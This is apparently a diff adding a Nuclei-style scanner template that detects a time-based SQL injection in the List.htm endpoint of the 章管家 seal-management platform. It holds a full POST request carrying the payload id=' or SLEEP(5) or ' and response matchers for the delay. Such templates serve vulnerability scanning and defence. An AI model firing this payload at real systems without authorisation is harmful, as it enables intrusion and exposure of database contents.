@@ -1,0 +1,35 @@
+id: zgj-list-sqli
+
+info:
+  name: 章管家 List.htm - SQL Injection
+  author: qwtd
+  severity: high
+  description: 章管家 List.htm存在SQL注入漏洞，攻击者通过漏洞可获取数据库敏感信息。
+  reference:
+    - https://github.com/wy876/wiki/blob/c1f9f2d41d7cd1cc5c5298d7da604c6c7a988c00/%E7%AB%A0%E7%AE%A1%E5%AE%B6-%E5%8D%B0%E7%AB%A0%E6%99%BA%E6%85%A7%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E7%AB%A0%E7%AE%A1%E5%AE%B6list.htm%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: 章管家
+
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        POST /app/department/list.htm?token=dingtalk_token HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+        token=dingtalk_token&person_id=1&unit_id=1&id=' or SLEEP(5) or '
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=5"
+          - "status_code == 200"
+          - 'contains(body, "未查询到相关数据")'
+        condition: and
